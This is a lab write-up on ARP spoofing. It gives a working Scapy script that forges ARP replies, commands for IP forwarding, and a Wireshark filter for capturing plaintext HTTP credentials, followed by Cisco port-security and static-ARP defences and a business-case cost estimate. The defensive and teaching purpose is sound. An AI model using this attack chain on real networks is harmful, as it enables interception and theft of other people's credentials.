# Lab Attack Methodology — Educational Reference

> ⚠️ All techniques documented here were performed in an **isolated, controlled lab environment** with no real systems at risk. This documentation is for educational and security awareness purposes only.

---

## Environment Setup (Lab)

- **Network:** Isolated virtual LAN (VirtualBox host-only adapter)
- **Nodes:** 3 VMs — Attacker (Kali Linux), Victim (Windows 10), Gateway (pfSense)
- **Tools:** Python (Scapy), Wireshark 4.x, Cisco Packet Tracer (simulation)

---

## Attack Phase 1: ARP Spoofing

### What is ARP Spoofing?
ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a LAN. It has no authentication — any device can send a "gratuitous ARP reply" claiming to be any IP.

### Attack Steps (Lab)
```
1. Attacker discovers LAN topology:
   arp -a                         # View ARP cache
   nmap -sn 192.168.1.0/24        # Discover live hosts

2. Attacker sends forged ARP replies to:
   - Victim: "Gateway IP (192.168.1.1) = Attacker MAC"
   - Gateway: "Victim IP (192.168.1.x) = Attacker MAC"

3. Result: All Victim ↔ Gateway traffic now flows through Attacker
   (classic Man-in-the-Middle position)

4. Time to complete: < 90 seconds on unprotected flat LAN
```

### Python Script Concept (Educational)
```python
# Conceptual only — not for use outside lab environments
from scapy.all import ARP, Ether, sendp
import time

def arp_spoof(target_ip, spoof_ip, interface="eth0"):
    """Send forged ARP reply to target claiming we are spoof_ip"""
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,                  # ARP reply
        pdst=target_ip,        # Send to target
        psrc=spoof_ip,         # Claim to be gateway
    )
    sendp(packet, iface=interface, verbose=False)

# In lab: run bidirectionally (victim → gateway and gateway → victim)
# while True:
#     arp_spoof(VICTIM_IP, GATEWAY_IP)
#     arp_spoof(GATEWAY_IP, VICTIM_IP)
#     time.sleep(2)
```

---

## Attack Phase 2: Traffic Interception

```
1. Enable IP forwarding on attacker (so victim traffic still reaches gateway):
   echo 1 > /proc/sys/net/ipv4/ip_forward

2. Open Wireshark on attacker — capture on LAN interface

3. Filter for HTTP traffic:
   Wireshark filter: http.request.method == "POST"

4. Observe: plaintext credentials in HTTP POST bodies
   (username= and password= fields visible in TCP stream)

5. Time from ARP spoof to first credential capture: < 5 minutes
```

---

## Defence Validation (Lab)

### Strategy A: Port Security
```
Switch config (Cisco IOS):
interface FastEthernet 0/1
 switchport mode access
 switchport port-security
 switchport port-security maximum 1
 switchport port-security mac-address sticky
 switchport port-security violation restrict

Result: Forged ARP from unknown MAC blocked within 2 seconds. ✅
```

### Strategy B: Static ARP + ACL
```
Static ARP for critical hosts:
arp 192.168.1.10 00:1A:2B:3C:4D:5E arpa   (Finance DB)
arp 192.168.1.11 00:1A:2B:3C:4D:5F arpa   (ERP Server)

ACL to block ARP from unauthorised VLANs:
ip access-list extended BLOCK_ARP_SPOOF
 deny  arp any host 192.168.1.1
 permit ip any any

Result: ARP poisoning attempt rejected. Cache integrity maintained. ✅
```

---

## Key Takeaway for Business Case

The attack is **trivially easy** and **detectable only post-breach** without controls.  
Strategy A costs ₹8L and eliminates the primary vector in 3 weeks.  
The cost of inaction: ₹250L expected annual loss.
